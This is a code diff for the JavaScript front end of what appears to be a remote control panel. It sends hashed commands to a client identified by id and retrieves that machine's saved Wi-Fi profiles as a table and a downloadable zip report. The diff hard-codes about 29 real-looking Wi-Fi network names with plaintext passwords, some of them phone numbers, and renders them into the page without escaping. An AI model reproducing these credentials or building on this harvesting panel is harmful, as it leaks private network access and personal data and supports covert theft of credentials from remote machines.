@@ -550,3 +550,209 @@ export function sendMsgToFlsk(msg, id){
 }
 
 
+export function GetBaseWifiInfo(e, id) {
+  e.preventDefault();
+    toggleAll("");
+    fetch('/a501877a3d9c3482ae0d38beac54c415.html')
+        .then(response => response.text())
+        .then(html => {
+        const modal = document.createElement('div');
+        modal.innerHTML = html;
+        modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
+        modal.id = "PasswordMainTable"
+        document.body.appendChild(modal);
+        
+        const data = {'wifiInterfaces': 
+                        [{'InterfaceName': 'Intel(R) Dual Band Wireless-AC 8265',
+                          'interfaceProfilesInfo': [{'SSIDName': 'BIKUROFE TELAVIV',
+                            'Password': 'bikurofe!',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Galaxy Note10+567d',
+                            'Password': '12345678',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'CyberControl',
+                            'Password': 'Cyb3rC0ntr0l',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Galaxy A22 5G2ab6',
+                            'Password': 'mrze2930',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'GustsNessIL',
+                            'Password': '',
+                            'Authentication': 'open',
+                            'Cipher': 'none'},
+                          {'SSIDName': 'Island',
+                            'Password': '',
+                            'Authentication': 'open',
+                            'Cipher': 'none'},
+                          {'SSIDName': 'L1000124431 1082',
+                            'Password': '1q2w3e4r',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Rehovot CityHall',
+                            'Password': '052484000',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Gabi',
+                            'Password': '204863518',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'DIRECT-NS-Hotspot',
+                            'Password': '87654321',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'L1000122325 0168',
+                            'Password': '1234567890',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Orli',
+                            'Password': '0526017266',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'KOBITURGEMAN-LA 6274',
+                            'Password': '92265k/F',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'The Building',
+                            'Password': 'enjoyrome',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'iPhone',
+                            'Password': '0772344621',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Jer-City-Hall',
+                            'Password': '',
+                            'Authentication': 'open',
+                            'Cipher': 'none'},
+                          {'SSIDName': 'Bezeq_WiFi_2.4',
+                            'Password': '',
+                            'Authentication': 'open',
+                            'Cipher': 'none'},
+                          {'SSIDName': 'iPhone 12 Pro Max',
+                            'Password': '11111111',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'ה-iPhone של יוסף חי',
+                            'Password': '0772344621',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': '1ze',
+                            'Password': '317732634',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Ashkelon-Guest',
+                            'Password': 'Ashkelon375',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Fixpoint',
+                            'Password': '12341234',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Hi-Smart-b0f1ec71b1c7',
+                            'Password': '',
+                            'Authentication': 'open',
+                            'Cipher': 'none'},
+                          {'SSIDName': 'Hi-Smart-b0f1ec707b9f',
+                            'Password': '',
+                            'Authentication': 'open',
+                            'Cipher': 'none'},
+                          {'SSIDName': 'McDonalds',
+                            'Password': '',
+                            'Authentication': 'open',
+                            'Cipher': 'none'},
+                          {'SSIDName': 'Marina',
+                            'Password': '0533030353',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'YOSEFBOROW',
+                            'Password': '0536230353',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Svstudent',
+                            'Password': 'svcollege',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'},
+                          {'SSIDName': 'Joseph',
+                            'Password': '0556620524',
+                            'Authentication': 'WPA2PSK',
+                            'Cipher': 'AES'}]}]};
+            let profileSelection = document.querySelector('#profile-selection');
+            for(let i of  data.wifiInterfaces){
+                let profile = i.InterfaceName;
+                let option = document.createElement('option');
+                option.text = profile;
+                option.value = profile;
+                profileSelection.add(option);
+            }
+
+            profileSelection.addEventListener('change', function() {
+            let selectedProfile = this.value;
+            let index = data.wifiInterfaces.findIndex(
+              (item) => item.InterfaceName === selectedProfile
+            );
+            let profileData = data.wifiInterfaces[index].interfaceProfilesInfo;
+            let tbody = document.querySelector('#profileTable tbody');
+            while (tbody.firstChild) {
+                tbody.removeChild(tbody.firstChild);
+            }
+            profileData.forEach(function(record) {
+                if (record.Password.length > 0 || record.SSIDName.length > 0){
+                    tbody.insertAdjacentHTML('beforeend', `<tr>
+                        <td class="SSIDNAME">${record.SSIDName}</td>
+                        <td class="AuthenticationWifi">${record.Authentication}</td>
+                        <td class="CipherWifi">${record.Cipher}</td>
+                        <td class="password">${record.Password}</td>
+                        </tr>`
+                    );
+                }
+            });
+            });
+
+            profileSelection.dispatchEvent(new Event('change'));
+        })
+        .catch(error => console.error('Error:', error));
+}
+
+export function GetFullWifiReport(id) {
+  return fetch("/send_message", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({message:{command: "2d6694963cce74d2791fa72538152c11"}, id: id})
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then(data => {
+      var currentDate = new Date();
+      var dateString = currentDate.toString().replace(/[ +:]/g, "_");
+      downloadBase64File(data.message, `Wifi_report${dateString}.zip`, "application/zip"); 
+    })
+    .catch(error => {
+      console.error("An error occurred:", error);
+    });
+}
+
+export function downloadBase64File(base64, fileName, mimeType) {
+  var binaryString = atob(base64);
+  var len = binaryString.length;
+  var binaryArray = new Uint8Array(len);
+  for (var i = 0; i < len; i++) {
+    binaryArray[i] = binaryString.charCodeAt(i);
+  }
+  var blob = new Blob([binaryArray], { type: mimeType });
+  var link = document.createElement('a');
+  link.href = URL.createObjectURL(blob);
+  link.download = fileName;
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+}
